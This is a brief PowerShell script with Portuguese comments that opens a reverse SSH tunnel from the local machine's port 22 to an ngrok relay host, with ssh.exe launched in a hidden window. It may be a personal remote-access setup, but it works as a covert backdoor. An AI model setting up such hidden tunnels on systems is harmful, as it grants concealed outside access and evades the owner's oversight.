# Comando SSH
$sshArgs = "-o ServerAliveInterval=60 -o ServerAliveCountMax=3 -o ExitOnForwardFailure=yes -R 2222:localhost:22 logosofico@0.tcp.sa.ngrok.io -p 14800 -N"

# Executa SSH em segundo plano invisível
Start-Process -FilePath "C:\Windows\System32\OpenSSH\ssh.exe" -ArgumentList $sshArgs -WindowStyle Hidden
